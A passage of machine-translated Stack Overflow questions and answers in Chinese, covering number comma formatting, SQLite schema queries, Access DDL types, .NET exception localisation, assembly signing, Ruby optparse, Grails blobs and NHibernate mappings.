性能测试表明**commaify()**是所有解决方案中最先进的：

```
Testing 999999 random values
commaify()        took 12.411s
addCommas()       took 17.863s
getCommaString()  took 18.519s
formatNumber()    took 14.409s
regex1()          took 40.654s
regex2()          took 36.985s 
```

此外 commaify() 可以扩展到包括十进制长度的参数和小数部分的零填充 - 它在**13.128s**上也优于其他参数：

```
public static function cappedDecimal( input:Number, decimalPlaces:int = 2 ):Number
{
    if ( decimalPlaces == 0 ) 
        return Math.floor( input );

    var decimalFactor:Number = Math.pow( 10, decimalPlaces );

    return Math.floor( input * decimalFactor ) / decimalFactor;
}

public static function cappedDecimalString( input:Number, decimalPlaces:int = 2, padZeros:Boolean = true ):String
{
    if ( padZeros )
        return cappedDecimal( input, decimalPlaces ).toFixed( decimalPlaces );
    else
        return cappedDecimal( input, decimalPlaces ).toString();
}

public static function commaifyExtended( input:Number, decimalPlaces:int = 2, padZeros:Boolean = true ):String
{
   var split:Array = cappedDecimalString( input, decimalPlaces, padZeros ).split( '.' ),
       front:String = split[0],
       back:String = ( split.length > 1 ) ? "." + split[1] : null,
       n:int = input < 0 ? 2 : 1,
       commas:int = Math.floor( (front.length - n) / 3 ),
       i:int = 1;

   for ( ; i <= commas; i++ )
   {
       n = front.length - (3 * i + i - 1);
       front = front.slice( 0, n ) + "," + front.slice( n );
   }

   if ( back )
       return front + back;
   else
       return front;
} 
```

所以，我会提供 commaify() 满足多功能性和性能的要求，但肯定不是最紧凑或最优雅的。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-04-06T13:04:24.487

这真的不是 RegEx 的最佳用途......我不知道数字格式化功能，但[这个线程](http://www.actionscript.org/forums/showthread.php3?t=75450)似乎提供了一个解决方案。

```
function commaCoder(yourNum):String {
    //var yourNum:Number = new Number();
    var numtoString:String = new String();
    var numLength:Number = yourNum.toString().length;
    numtoString = "";

    for (i=0; i<numLength; i++) { 
        if ((numLength-i)%3 == 0 && i != 0) {
            numtoString += ",";
        }
        numtoString += yourNum.toString().charAt(i);
        trace(numtoString);
    }
    return numtoString;
} 
```

如果您真的坚持使用 RegEx，您可以反转字符串，应用 RegEx 替换功能，然后将其反转回来。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-04-06T13:07:45.010

[性别者](http://japhy.perlmonk.org/sexeger/sexeger.html)对此有好处。简而言之，sexeger 是针对您反转输出的反转字符串运行的反转正则表达式。它通常比替代方案更有效。这是您想要做的一些伪代码：

```
string = reverse string
string.replace(/(\d{3})(?!$)/g, "$1,")
string = reverse string 
```

这是一个 Perl 实现

```
#!/usr/bin/perl

use strict;
use warnings;

my $s = 13_456_789;

for my $n (1, 12, 123, 1234, 12345, 123456, 1234567) {
    my $s = reverse $n;
    $s =~ s/([0-9]{3})(?!$)/$1,/g;
    $s = reverse $s;
    print "$s\n";
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-06-12T20:49:47.033

您可能需要考虑[NumberFormatter](http://help.adobe.com/en_US/as3/dev/WS9b644acd4ebe59998b99a90125fc4fecfb-7ffb.html)

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2020-11-20T19:40:06.200

我会因为不是所请求的语言而反对，但这种非正则表达式技术应该适用（我通过搜索“C# regex to add commas into number”到达这里）

```
var raw = "104241824    15202656 KB 13498560 KB 1612672KB already 1,000,000 or 99.999 or 9999.99";

int i = 0;
bool isnum = false;
var formatted = raw.Reverse().Aggregate(new StringBuilder(), (sb, c) => {
    //$"{i}: [{c}] {isnum}".Dump();

    if (char.IsDigit(c) && c != ' ' && c!= '.' && c != ',') {
        if (isnum) {
            if (i == 3) {
                //$"ins ,".Dump();
                sb.Insert(0, ',');
                i = 0;
            }
        }
        else isnum = true;
        i++;
    }
    else {
        isnum = false;
        i = 0;
    }

    sb.Insert(0, c);
    return sb;
}); 
```

结果是：

> `104,241,824 15,202,656 KB 13,498,560 KB 1,612,672KB already 1,000,000 or 99.999 or 9,999.99`

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2012-08-30T04:44:43.367

// 这是一个简单的代码，它工作正常...:)

```
import java.util.Scanner;

public class NumberWithCommas {

    public static void main(String a[]) {
        Scanner sc = new Scanner(System.in);

        String num;

        System.out.println("\n enter the number:");

        num = sc.next();

        printNumber(num);
    }

    public static void printNumber(String ar) {
        int len, i = 0, temp = 0;
        len = ar.length();
        temp = len / 3;
        if (len % 3 == 0)
            temp = temp - 1;
        len = len + temp;
        char[] ch = ar.toCharArray();
        char[] ch1 = new char[len];
        for (int j = 0, k = (ar.length() - 1); j < len; j++)
        {
            if (i < 3)
            {
                ch1[j] = ch[k];
                i++;
                k--;
            }
            else
            {
                ch1[j] = ',';
                i = 0;
            }
        }
        for (int j = len - 1; j >= 0; j--)
            System.out.print(ch1[j]);
        System.out.println("");
    }
} 
```

* * *

## 回答 #10

> 赞同：-1
> 
> 时间：2018-05-22T15:51:11.113

如果你不能在正则表达式上使用前瞻，你可以使用这个：

```
string.replace(/^(.*?,)?(\d{1,3})((?:\d{3})+)$/, "$1$2,$3") 
```

在一个循环中，直到没有东西可以替换。

例如，perlish 解决方案如下所示：

```
my $num = '1234567890';
while ($num =~ s/^(.*?,)?(\d{1,3})((?:\d{3})+)$/$1$2,$3/) {} 
```

* * *

## 回答 #11

> 赞同：-1
> 
> 时间：2020-01-12T12:08:14.097

Perl RegExp 1 衬里：

`1 while $VAR{total} =~ s/(.*\d)(\d\d\d)/$1,$2/g;`

* * *

## 回答 #12

> 赞同：-2
> 
> 时间：2014-10-17T22:32:14.360

试试这个代码。它简单且性能最佳。

```
var reg:RegExp=/\d{1,3}(?=(\d{3})+(?!\d))/g;
var my_num:Number = 48712694;
var my_num_str:String = String(my_num).replace(reg,"$&,");
trace(my_num_str); 
```

：：输出：：

```
48,712,694 
```

# sqlite - 如何快速了解 SQLite 中的表结构？

> ID：721307
> 
> 赞同：22
> 
> 时间：2009-04-06T12:55:32.260
> 
> 标签：sqlite

是否有类似“显示 TABLENAME 中的列”之类的命令？我只知道 .dump 命令，但在这种情况下这真的很愚蠢。它也列出了所有数据。

我需要一些东西来查看表结构。

* * *

## 回答 #1

> 赞同：55
> 
> 时间：2009-04-06T13:01:32.620

您需要使用[PRAGMA](http://www.sqlite.org/pragma.html#schema)。

`PRAGMA table_info(TABLENAME);`

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2009-04-06T13:01:27.397

`select * from sqlite_master`

我认为应该工作。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-03-05T03:05:35.183

在 SQLite 3 中，执行：

.schema 表名

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-02-08T09:04:19.730

另一种方式，您可以使用 Firefox 的 SQLite 管理器插件

[https://addons.mozilla.org/vi/firefox/addon/sqlite-manager/](https://addons.mozilla.org/vi/firefox/addon/sqlite-manager/)

# sql - 可用于 Microsoft Access 中的“CREATE TABLE”的字段类型

> ID：721312
> 
> 赞同：9
> 
> 时间：2009-04-06T12:56:37.250
> 
> 标签：sql, database, ms-access

我不高兴为 Microsoft Access 生成表创建脚本。我还没有找到任何描述各种类型的语法的文档。我在 Access 中[找到了 Create Table 语句的文档](http://msdn.microsoft.com/en-us/library/bb177893.aspx)，但很少提及可以使用的类型。例如：

```
CREATE TABLE Foo (MyIdField *FIELDTYPE*) 
```

FIELDTYPE 是...之一？通过反复试验，我发现了一些类似 INTEGER、BYTE、TEXT、SINGLE 的内容，但我真的很想找到一个记录所有内容的页面，以确保我使用的是正确的。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-04-06T13:03:17.827

我发现下面链接中的表格非常有用：

[http://allenbrowne.com/ser-49.html](http://allenbrowne.com/ser-49.html)

它列出了 Access 的 Gui 对每种数据类型的称呼、DDL 名称、DAO 名称和 ADO 名称（它们都是不同的……）。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-04-07T08:08:44.750

可以在此处找到 Microsoft 关于 ACE/Jet 的 SQL 数据定义语言 (SQL DDL) 主题的一些最佳文档：

[Access 2000 的中级 Microsoft Jet SQL](http://msdn.microsoft.com/en-us/library/aa140015(office.10).aspx)

特别感兴趣的是同义词，它们对于编写可移植的 SQL 代码很重要。

需要注意的一点是，Jet 4.0 版本的 SQL DDL 语法要求接口处于 ANSI-92 查询模式；这篇文章提到了 ADO，因为 ADO 总是使用 ANSI-92 查询模式。MS Access 界面的默认选项是 ANSI-89 查询模式，但是从 Access2003 开始​​，UI 可以进入 ANSI-92 查询模式。所有版本的 DAO 都使用 ANSI-89 查询模式。我不确定是否为 Access2007 的 ACE 扩展了 SQL DDL 语法。

有关查询模式的更多详细信息，请参阅 [关于 ANSI SQL 查询模式 (MDB)](http://office.microsoft.com/en-gb/access/HP030704831033.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-02-13T04:58:55.477

[这](https://msdn.microsoft.com/en-us/library/ms714540(v=vs.85).aspx)应有尽有。它直接来自 MS，实际上告诉您与 GUI 名称相关的 SQL 数据类型是什么。

# windows-installer - 如何恢复要宣传的已安装功能？

> ID：721322
> 
> 赞同：0
> 
> 时间：2009-04-06T12:57:45.737
> 
> 标签：windows-installer

我的产品中有一个功能，我希望通过分配的广告按需安装（即，[当访问广告文件、快捷方式或 COM 类时，它会被真实安装](http://msdn.microsoft.com/en-us/library/aa367548(VS.85).aspx)）。安装此功能会带来一些安全隐患，这就是为什么我希望仅在需要时才安装它。出于同样的原因，我还希望在不再需要该功能时将其删除。理想情况下，它会再次被宣传，以便在需要时可以重新激活。

是否可以使用标准 MSI 技术将功能恢复到广告状态，而不是删除它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-14T11:59:26.500

您可以使用安装程序 API 功能“MsiConfigureFeature”。您可以在那里控制功能的状态。

[MSDN - MsiConfigureFeature 功能](http://msdn.microsoft.com/en-us/library/aa370069(VS.85).aspx)

# c# - 使用 ToArgb() 后跟 FromArgb() 不会产生原始颜色

> ID：721324
> 
> 赞同：5
> 
> 时间：2009-04-06T12:58:33.860
> 
> 标签：c#, .net, colors, system.drawing.color

这不起作用

```
 int blueInt = Color.Blue.ToArgb();
        Color fred = Color.FromArgb(blueInt);
        Assert.AreEqual(Color.Blue,fred); 
```

有什么建议么？

[编辑]

我正在使用 NUnit，输出是

失败的：

预期：颜色[蓝色]

但是是：颜色 [A=255, R=0, G=0, B=255]

[编辑]

这行得通！

```
 int blueInt = Color.Blue.ToArgb();
        Color fred = Color.FromArgb(blueInt);
        Assert.AreEqual(Color.Blue.ToArgb(),fred.ToArgb()); 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-04-06T13:10:28.170

从[MSDN 文档中`Color.operator ==`](http://msdn.microsoft.com/en-us/library/system.drawing.color.op_equality.aspx)：

> 此方法比较的不仅仅是 Color 结构的 ARGB 值。它还对一些州旗进行了比较。如果您只想比较两个 Color 结构的 ARGB 值，请使用 ToArgb 方法进行比较。

我猜州旗是不同的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-06T13:15:22.447

它们不等于相同，因为 Color.Blue 不等于您的颜色对象，它等于内部存储的内容，即“新颜色（KnownColor.Blue）；” 确切地说。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T13:05:50.287

由于值类型的装箱，我会期望 Assert.AreSame 会这样，但 AreEqual 不应该有这个问题。

您能否添加您使用的语言（我假设是 C#）和测试框架？

结果是什么`Assert.AreEqual(true, Color.Blue == fred);`？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2010-01-01T04:58:38.373

或者，这也有效，我认为它更直观

```
 [Test]
    public void ColorTransform()
    {
        var argbInt = Color.LightCyan.ToArgb();
        Color backColor = Color.FromArgb(argbInt);
        Assert.AreEqual(Color.LightCyan.A, backColor.A);
        Assert.AreEqual(Color.LightCyan.B, backColor.B);
        Assert.AreEqual(Color.LightCyan.G, backColor.G);
        Assert.AreEqual(Color.LightCyan.R, backColor.R);
    } 
```

# .net - 在 .NET 框架中强制使用英语语言异常

> ID：721337
> 
> 赞同：39
> 
> 时间：2009-04-06T13:01:21.467
> 
> 标签：.net, asp.net-mvc, exception, localization

在使用 ASP.NET MVC 时，我注意到安装在我的系统上的 .NET 框架发出的异常消息是德语的。我真的更喜欢英文信息，所以我可以在 SO 上发布它们。

我知道之前在 SO 上已经问过这个问题，但奇怪的是，在我的情况下，建议的解决方法似乎都不起作用。我已经尝试过以下方法：

*   将我的 Windows 系统切换到英语语言环境并重新启动 Visual Studio
*   设置工具 -> 选项 -> 环境 -> 国际设置 -> 语言为“英语”
*   在抛出异常之前将线程语言环境设置为英语，如下所示：

    Thread.CurrentThread.CurrentCulture = CultureInfo.CreateSpecificCulture ("en-US"); Thread.CurrentThread.CurrentUICulture=new CultureInfo("en-US");

    //调用我的错误方法...

那么，如何让 .NET 框架发出英语异常消息？是否有任何方法可以在每个解决方案甚至整个系统范围内执行此操作？

**编辑：**执行我的单元测试时抛出异常。我不确定这是否是设置线程文化无效的原因。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2011-11-04T08:40:48.007

卸载德语语言包：

开始 - 控制面板 - 程序和功能 - Microsoft .NET Framework (4 Client Profile) 语言包 DEU - 卸载 (Deinstallieren)

您可能需要对在那里找到的每个 .NET Framework 版本重复卸载。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2009-04-09T13:05:19.827

正如我刚刚发现的那样，问题确实与拥有不同的测试项目有关。虽然我在实际项目中尝试将 UI 语言设置为英语，但我在测试项目中没有这样做，这就是为什么在查看测试结果时异常消息仍然是德语的原因。

在抛出异常之前在测试方法中设置 UI 语言对我来说是诀窍。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2009-04-06T17:15:29.110

您是否尝试过将 UI 文化设置为 " `en`" in `web.config`？更多信息[在这里](http://msdn.microsoft.com/en-us/library/bz9tc508.aspx)。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2016-11-10T23:31:48.517

我在 web.config 中尝试了以下更改，它有所帮助：

```
<system.web>
    <globalization uiCulture="en-US" culture="en-US" />
... 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-04-07T18:45:46.467

显然，所有框架异常消息都绑定到已安装的操作系统语言。因此，除非您安装英文版的 Windows，否则 .Net 框架异常不会以英文显示。尽管将 CurrentUICulture 设置为“en-US”似乎很奇怪，但我使用这种变通方法在我的荷兰语 Windows 操作系统上显示英文消息。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2010-08-31T12:02:52.420

实际上不存在一个好的解决方案，投票连接这个方法

[https://connect.microsoft.com/VisualStudio/feedback/details/591839/exception-localization-in-app-config-and-web-config](https://connect.microsoft.com/VisualStudio/feedback/details/591839/exception-localization-in-app-config-and-web-config)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-04-06T13:11:38.760

您是否尝试在阅读异常文本之前立即切换文化？可能是在您访问消息时发生本地化 - 而不是在创建异常对象时发生。

# vb.net - 强签名程序集

> ID：721340
> 
> 赞同：27
> 
> 时间：2009-04-06T13:01:33.837
> 
> 标签：vb.net, compiler-construction, publishing

我有一个用 Visual Basic 2008 Express 制作的项目。我从别人的 C# 项目中转换了它，但它可以工作。它有几个 DLL 依赖项。我去发布我的项目，以便可以将其安装在另一台机器上，并且对于每个 DLL，我收到一个错误：“程序集必须经过强签名才能被标记为先决条件。” 我做了一些研究，但没有发现很多，而且我发现我并不真正了解。这个错误是什么意思？解决它的最佳方法是什么？另一件事：我花了很长时间才能正确引用我的所有 dll，所以我更喜欢该解决方案与移动 DLL 无关，因为这可能会破坏我的主项目中的功能。

* * *

## 回答 #1

> 赞同：50
> 
> 时间：2009-04-06T13:05:04.890

如果您通过 ClickOnce 发布，请转到发布页面并单击“应用程序文件”。从那里你应该看到你的 DLL 的列表。确保给您带来麻烦的那些将其发布状态标记为“包含”而不是“先决条件”。

此错误消息的含义是，当前的发布设置将期望所有有问题的程序集都存在于目标计算机上的全局程序集缓存中，然后才能进行安装。由于 GAC 中的所有程序集都必须经过强签名，因此任何标记为非强签名的先决条件的程序集都会出现此错误。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-08-23T14:15:08.930

解决方法比这更简单：

1.  转到您的项目。
2.  右键单击并选择属性。
3.  转到安全选项卡。
4.  取消选中启用 ClickOnce 安全设置。

除非您通过 ClickOnce 部署此应用程序，否则您不需要为您的程序集命名。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-04-06T13:07:15.697

强命名程序集主要是由加密密钥签名的程序集。使用 Visual Studio 很容易做到这一点，并且不需要重新排序依赖项。

我使用的是非 Express Visual Studio，因此步骤对您来说可能略有不同。

*   右键单击项目并选择属性
*   单击“签名”选项卡
*   选中“签署程序集”
*   在组合框中选择“<新建...>”
*   完成向导
*   重建

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-04-06T13:06:02.080

检查此链接...它具有使用强名称签署程序集的说明：

[MSDN：使用强名称签署程序集](http://msdn.microsoft.com/en-us/library/xc31ft41(VS.71).aspx)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-04-06T13:09:49.187

要创建强名称，只需转到 SDK 命令提示符或 Visual Studio 200X 命令提示符，然后键入以下内容

```
sn -k sgKey.snk 
```

有关详细信息，请参阅[此链接](http://msdn.microsoft.com/en-us/library/6f05ezxy(VS.71).aspx)

然后通过运行以下命令将强名称关联到您的程序集

```
al /out:MyAssembly.dll MyOldAssembly.dll /keyfile:sgKey.snk 
```

有关详细信息，请参阅[此链接](http://msdn.microsoft.com/en-us/library/xc31ft41(VS.71).aspx)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2010-07-09T10:00:56.340

在上述解决方案失败后，这对我有用：

删除对错误程序集的引用，然后重新添加。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2010-06-30T17:01:19.670

检查目标框架是否实际设置为 3.5 或您想要定位的任何框架。有时设置不正确会报错。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2011-12-09T23:35:57.403

我发现我的问题出在 .csproj 文件中

```
<Reference Include="OtherProjectNothingToDo">
  <HintPath>..\..\..\..\Pedidos\XBAP\Pedidos\Pedidos\bin\Release\Pedidos.exe</HintPath>
</Reference> 
```

然后我使用记事本将其删除，现在可以了。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2012-11-10T00:05:30.887

使用[Adam Robinson 的](https://stackoverflow.com/users/82187/adam-robinson)解决方案允许我发布，但我发现用户无法在项目发布后安装该项目，因为最终用户系统会抱怨无法安装，并指出硬盘空间。由于这似乎不太可能是根本原因，因此我进一步研究了它。

显然，我的问题的基础是我的一个引用也引用了我的项目使用的 .dll，但版本不同。ClickOnce 没有这个，并拒绝将 .dll 的第二个版本复制到用户的系统，引用该版本已经存在。修复它，使 .dll 和项​​目引用另一个 .dll 的相同版本消除了错误并更正了安装问题。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2013-10-07T13:35:49.273

我也刚遇到这个问题。在我的情况下，我的解决方案中引用了 blabla.dll，但我在项目中引用的 another.dll 中也使用了 blabla.dll。

在检查两个 blabla.dll 的版本时，它们并不相同。所以我用正确的 blabla.dll 更新了 another.dll，然后在我的解决方案中引用了新的 another.dll。错误消失了。

简而言之：我使用了 2 个版本的 blabla.dll

我希望这是有道理的，如果不让我知道的话。:)

查看我的博客以获得更详细的解释： [博客文章](http://jacobiedema.blogspot.nl/2013/10/assembly-must-be-strong-signed-in-order.html)

问候， 雅各布·伊德玛

# ruby - 使用 Ruby 从命令行参数中提取文件名

> ID：721342
> 
> 赞同：2
> 
> 时间：2009-04-06T13:02:35.600
> 
> 标签：ruby, optparse

我正在尝试使用[optparse](http://www.ruby-doc.org/stdlib/libdoc/optparse/rdoc/classes/OptionParser.html)来解析命令行参数。我希望我的程序接受这样的参数：

```
$ ./myscript.rb [options] filename 
```

我可以轻松管理该`[options]`部分：

```
require 'optparse'

options = { :verbose => false, :type => :html }

opts = OptionParser.new do |opts|
  opts.on('-v', '--verbose') do
    options[:verbose] = true
  end
  opts.on('-t', '--type', [:html, :css]) do |type|
    options[:type] = type
  end
end
opts.parse!(ARGV) 
```

但我如何得到`filename`？

我可以手动从中提取它`ARGV`，但必须有更好的解决方案，只是无法弄清楚如何

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-04-06T13:33:29.800

“parse”方法返回未处理的 ARGV。因此，在您的示例中，它将返回一个包含文件名的元素数组。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-07-30T15:12:20.020

> 我不能只使用 ARGV.pop。例如，当最后一个参数是“css”时，它可能是一个文件或属于 --type 开关。

但是，如果您的脚本要求最后一个参数是文件名（这是您的使用输出查询的内容），这种情况应该永远不会发生，脚本应该以非零值退出，并且用户应该得到使用报告或错误。

现在，如果您想创建默认文件名或不需要文件名作为最后一个参数但将其保留为可选，那么您只需测试最后一个参数是否为有效文件。如果是这样，请按预期使用它，否则继续没有等。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-09-07T15:39:21.043

希望这个答案仍然有用。

Ruby 有一个`built-in`变量`__FILE__`可以完成这种类型的工作。

```
puts __FILE__ 
```

它会打印出你的文件名。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2009-04-06T13:18:59.663

我不认为在将其发送到 OptionParser 之前提取它是不好的，我认为这是有道理的。我可能这么说是因为我以前从未使用`OptionParser`过，但是哦，好吧。

```
require 'optparse'

file = ARGV.pop
opts = OptionParser.new do |opts|
  # ...
end 
```

# apache-flex - 在 Adob e Flex 中生成图表/图形/数据可视化的最佳方式是什么？

> ID：721346
> 
> 赞同：0
> 
> 时间：2009-04-06T13:03:50.400
> 
> 标签：apache-flex, graphics, charts, data-visualization

我是 Flex 的新手，但需要生成一些基于时间的数据的可视化。对于在 Flex 中运行良好的工具有什么建议吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-04-10T20:44:23.557

一定要密切关注一个名为[Axiis](http://www.twgonzalez.com/blog/?p=172)的新项目，该项目最近由著名的 Flex 开发人员 Tom Gonzalez 宣布。这是一个数据可视化框架，应该让自定义图表变得非常有趣。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-06T13:19:49.130

Flex Builder Pro 让您可以访问 mx.charts 中的图形可视化库。

如果你想要一个开源解决方案，你可以试试[Flare](http://flare.prefuse.org/)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T13:07:54.430

内置 mx.charts 的其他内容？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-06T13:30:34.253

如果您愿意为此付费（我认为它在 250 美元左右），Flex Builder Pro 绝对是您的最佳选择。图书馆中的图形和图表功能令人印象深刻。无需太多编码即可生成漂亮、复杂的图形非常简单。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-04-16T12:35:50.523

我正在使用标准的 Flex Charting - 这是非常可配置的 - 我们已经能够让它看起来非常像我们想要的......

但是，还请查看 iLog Elixir - 它们提供了一些您可能会发现有用的极好附加图表 - 特别是 3D 图表。雷达图在某些情况下可能非常有效，但您确实需要在正确的地方使用这种东西。他们还有一个很好的热图和数据透视图。

问候，

杰米。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2011-02-08T21:33:48.753

amCharts 是一些非常有趣的图表，它们有免费的标志和付费的源版本。它们可以直接在网页中使用，通过 XML 提供设置，通过 CSV 提供数据（作为服务，通过 javascript 或其他方式），也可以在 Flex 项目中使用。

# c++ - std::wcout << L"élève" 的意外输出；在 Windows 外壳中

> ID：721357
> 
> 赞同：3
> 
> 时间：2009-04-06T13:07:01.173
> 
> 标签：c++, unicode, wchar-t, mojibake

在测试一些函数以在 wchar_t 和 utf8 之间转换字符串时，我在 Visual C++ express 2008 中遇到了以下奇怪的结果

```
std::wcout << L"élève" << std::endl; 
```

打印出“ÚlÞve:”，这显然不是预期的。

这显然是一个错误。怎么可能 ？我应该如何处理这样的“功能”？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2009-04-06T13:09:24.787

C++ 编译器不支持代码文件中的 Unicode。您必须用它们的转义版本替换这些字符。

试试这个：

```
std::wcout << L"\x00E9l\x00E8ve" << std::endl; 
```

此外，您的控制台也必须支持 Unicode。

更新：

它不会在您的控制台中产生所需的输出，因为控制台不支持 Unicode。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-06T13:31:26.387

我发现这些相关问题和有用的答案 [是否有 Windows 命令外壳可以显示 Unicode 字符？](https://stackoverflow.com/questions/379240/is-there-a-windows-command-shell-that-will-display-unicode-characters) [如何在源文件中嵌入 unicode 字符串常量？](https://stackoverflow.com/questions/442735/how-can-i-embed-unicode-string-constants-in-a-source-file)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-06T13:12:33.423

您可能还想看看[这个问题](https://stackoverflow.com/questions/442735/how-can-i-embed-unicode-string-constants-in-a-source-file)。它展示了如何使用一些编译器将 unicode 字符实际硬编码到文件中（我不确定 MSVC 会有哪些选项）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2010-08-21T02:25:19.753

> 这显然是一个错误。怎么可能？

虽然其他操作系统已经放弃了传统字符编码并切换到 UTF-8，但 Windows 使用**两种**传统编码：“OEM”代码页（用于命令提示符）和“ANSI”代码页（用于 GUI）。

您的 C++ 源文件位于 ANSI 代码页 1252（或可能是 1254、1256 或 1258）中，但您的控制台将其解释为 OEM 代码页 850。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-11-11T08:42:49.277

您的 IDE 和编译器使用 ANSI 代码页。控制台使用 OEM 代码页。

你用这些转换函数做什么也很重要。

# grails - 如何使用 Grails 将文件存储在数据库中

> ID：721358
> 
> 赞同：6
> 
> 时间：2009-04-06T13:07:10.160
> 
> 标签：grails, file-upload

我需要使用 Grails 在数据库中存储一个文件。那么，你知道我该怎么做吗？我应该在域类中使用哪种数据类型（byte[] 可能是一个解决方案）？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-04-06T14:23:54.920

[请参阅Grails 用户指南](http://docs.grails.org/latest/guide/single.html#uploadingFiles)中关于上传文件的章节。也可以使用 java.sql.Blob 作为二进制内容的类型（在处理大文件时更可取）。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-04-07T12:25:16.087

或者，将文件存储在磁盘上，并将其路径存储在数据库中。在磁盘上访问该文件通常比在数据库中访问该文件要快。但当然，这真的取决于您在应用程序中的需求。但请注意这种选择。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2010-10-14T07:09:22.423

在使用列映射更新或生成数据库时，您可以强制域对象使用特定类型：

```
byte[] orgFile

static mapping = {
   columns { 
    orgFile type:'blob'
   }
} 
```

到目前为止，这对我有用；）

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2010-07-16T11:02:38.263

我曾经也有过一样的问题。我需要做的就是转到数据库 (Oracle) 并将列类型从 RAW 更改为 Blob。（实际上我必须删除该列，然后创建一个新列）。如上所述，我永远无法找到如何使用“java.sql.Blob”。我发现了[this (converting from bytes to Blob)](http://capitalcodemonkey.blogspot.com/2008/05/mapping-document-from-byte-to-blob-in.html)，但看起来有点复杂。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-04-15T15:12:35.857

我最近在域类中使用 byte[] 来存储文件，它工作正常，直到我将我的应用程序从“HSQLDB”移动到“Oracle express”。在 Oracle 上，byte[] 被映射到一个原始对象而不是 blob...（不确定到底出了什么问题），我终于通过使用 java.sql.blob 解决了这个问题

# nhibernate - NHibernate：坚持一个有孩子的对象

> ID：721363
> 
> 赞同：2
> 
> 时间：2009-04-06T13:09:30.903
> 
> 标签：nhibernate

我正在尝试使用一组子对象来持久化一个对象。我不能先坚持孩子，因为有 FK 关系。我可以先保存父级，然后将子级添加到其中，但这会引入更多工作。基本上，我只是想一步一步地保存一个完全填充的对象，而不是将它分成几部分。我的映射有什么问题（抱歉它看起来很丑）还是我的方法？

家长：

```
<?xml version="1.0" encoding="utf-8" ?>
<hibernate-mapping xmlns="urn:nhibernate-mapping-2.2">
  <class name="NetworkOrderManagement.Core.Order, NetworkOrderManagement.Core" table="NETORDMGMT.ORDERHEADER" lazy="false" >
    <id name="OrderId" column="ORDERID" type="int">
      <generator class="seqhilo">
        <param name="sequence">ORDERID_SEQ</param>
      </generator>
    </id>
    <property name="TransmissionDate" column="TRANSMISSIONDATE" type="DateTime"/>
    <property name="StoreNumber" column="STORENUMBER" type="Int16"/>
    <property name="Department" column="DEPARTMENT" type="Int16"/>
    <property name="OrderType" column="ORDERTYPE" type="Int16"/>
    <property name="OrderSequence" column="ORDERSEQUENCE" type="Int16"/>
    <property name="ExtractTime" column="EXTRACTTIME" type="DateTime"/>
    <property name="Status" column="STATUS" type="Int16"/>
    <property name="ReceivedTime" column="RECEIVEDTIME" type="DateTime"/>
    <bag name="OrderDetail" table="NETORDMGMT.ORDERDETAIL" 
         lazy="false" cascade="all" inverse="true">
      <key column="ORDERID" on-delete="cascade"/>
      <one-to-many class="NetworkOrderManagement.Core.OrderDetail, NetworkOrderManagement.Core"  />
    </bag>
  </class>
</hibernate-mapping> 
```

孩子：

```
<?xml version="1.0" encoding="utf-8" ?>
<hibernate-mapping xmlns="urn:nhibernate-mapping-2.2">
  <class name="NetworkOrderManagement.Core.OrderDetail, NetworkOrderManagement.Core" table="NETORDMGMT.ORDERDETAIL" lazy="false">
    <id name="OrderDetailId" column="ORDERDETAILID" type="int">
      <generator class="seqhilo">
        <param name="sequence">"ORDERDTLID_SEQ"</param>
      </generator>
    </id>
<many-to-one name="Order" class="NetworkOrderManagement.Core.Order, NetworkOrderManagement.Core"
                 column="OrderId" lazy="false" not-null="true" />
    <property name="ItemNumber" column="ITEMNUMBER" type="Int32"/>
    <property name="OrderQuantity" column="ORDERQUANTITY" type="Int32"/>
    <property name="ErrorCode" column="ERRORCODE" type="Int32"/>
